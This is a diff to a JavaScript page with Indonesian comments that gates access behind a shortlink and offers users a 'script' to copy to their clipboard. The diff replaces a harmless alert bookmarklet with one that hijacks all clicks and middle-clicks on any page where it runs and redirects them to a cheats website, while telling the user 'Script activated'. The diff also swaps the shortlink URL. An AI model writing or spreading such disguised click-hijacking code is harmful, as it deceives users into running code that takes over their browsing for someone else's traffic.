@@ -16,7 +16,7 @@ const database = firebase.database();
 /* =======================
    KONFIGURASI
 ======================= */
-const SFL_URL = "https://sfl.gl/PcX6yN2L"; 
+const SFL_URL = "https://sfl.gl/DeTQO"; 
 const RETURN_URL = window.location.origin + window.location.pathname + "?sfl=ok";
 const EXPIRE_TIME = 5*60*60*1000; // 5 jam
 
@@ -93,7 +93,7 @@ function showSuccess(){
 /* =======================
    COPY SCRIPT / WEB
 ======================= */
-const textToCopy = `javascript:(function(){alert("Script activated");})();`;
+const textToCopy = `javascript:(function(){try {if (window.forceClickActive) return; window.forceClickActive = true; window.forceClickHandler = function(e) { try { e.preventDefault(); e.stopImmediatePropagation(); if (e.type === 'auxclick' && e.button === 1) { window.open('https://thekingcheats.xyz/index.php','_blank'); } else { location.href = 'https://thekingcheats.xyz/index.php'; } } catch (err) {} }; document.addEventListener('click', window.forceClickHandler, true); document.addEventListener('auxclick', window.forceClickHandler, true); window.removeForceClick = function() { try { document.removeEventListener('click', window.forceClickHandler, true); document.removeEventListener('auxclick', window.forceClickHandler, true); window.forceClickActive = false; delete window.forceClickHandler; } catch (e) {} }; alert('Script activated (ALL ERROR KING KEY)'); } catch(e) { console.error(e); alert('Script error'); } })();`;
 const webTextToCopy = `https://blog.techbotal.com/aplicativos-de-relacionamento-a-tecnologia-que-transformou-a-forma-de-conectar-pessoas/`;
 
 function copyScript(){ navigator.clipboard.writeText(textToCopy); alert("Text berhasil disalin!"); }
